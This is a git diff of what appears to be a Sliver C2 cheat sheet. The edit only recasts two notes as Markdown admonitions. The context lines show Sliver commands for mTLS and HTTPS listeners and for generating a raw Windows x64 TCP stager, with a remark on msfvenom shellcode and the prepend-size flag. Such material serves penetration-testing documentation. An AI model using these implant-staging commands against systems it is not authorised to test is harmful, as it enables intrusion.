@@ -425,7 +425,9 @@ Flags:
 
 #### 4.3.2.1 - Syntax
 
-* Note: Any listener will work the only detail you should pay attention on the `stage-listener` sliver command
+
+> [!NOTE]
+> Any listener will work the only detail you should pay attention on the `stage-listener` sliver command.
 
 ```
 sliver > mtls -L <IP> -l 4488
@@ -455,7 +457,8 @@ sliver > generate stager -r tcp -L <IP> -l 8080 -a x64 -o windows -f raw -s stag
 
 #### 4.3.2.3 - HTTP
 
-Note: `-P` or `--prepend-size` treats the first four bytes as instructions that your shellcode loader may not took this into account. It uses `msfvenom` to generate shellcode for you if it's installed on your system.
+> [!NOTE] Prepend Size
+> `-P` or `--prepend-size` treats the first four bytes as instructions that your shellcode loader may not took this into account. It uses `msfvenom` to generate shellcode if it's installed on your system.
 
 ```
 sliver > https -L <IP> -l 4488
